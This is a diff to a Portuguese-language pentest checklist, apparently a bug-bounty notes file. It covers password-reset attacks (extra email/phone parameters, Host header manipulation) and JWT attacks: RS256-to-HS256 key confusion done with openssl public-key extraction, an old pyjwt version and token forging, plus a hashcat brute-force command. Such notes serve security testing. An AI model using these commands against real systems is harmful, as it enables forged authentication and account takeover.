@@ -54,6 +54,7 @@
     - XSStrike
 
 ## reset senha
+- adicionar parametro de email/telefone
 - pedir reset de senha alterando header Host
 - tentar alterar a senha sem a atual
 
@@ -74,9 +75,9 @@
     - remover signature
 - key confusion / trocar algoritmo de assinatura
     - trocar cifra RS256 (RSA, que é assimetrico) para HS256 (HMAC, que é simetrico) e usar chave publica para assinar
-    - openssl s_client -connect victim.com:443 | openssl x509 -pubkey -noout > public.pem
-    - pip install pyjwt==0.4.3
-    - import jwt; print(jwt.encode({"data":"test"}, key=open("public.pem", "r").read(), algorithm="HS256"))
+    - 1) <pre> openssl s_client -showcerts -connect target.com:443 certs.pem && csplit -z -f 'cert' -b '%02d.pub' certs.pem '/BEGIN/' '{*}' && rm certs.pem && find . -maxdepth 1 -name "*.pub" -exec sh -c "openssl x509 -in {} -pubkey > {}.pem" \; && rm *.pub</pre>
+    - 2) ```JOSEPH``` or ```pip install pyjwt==0.4.3```
+    - 3) import jwt; print(jwt.encode({"data":"test"}, key=open("public.pem", "r").read(), algorithm="HS256"))
 - brute
     - hashcat -m 16500 hash.txt -a 3 -w 3 ?a?a?a?a?a?a
 
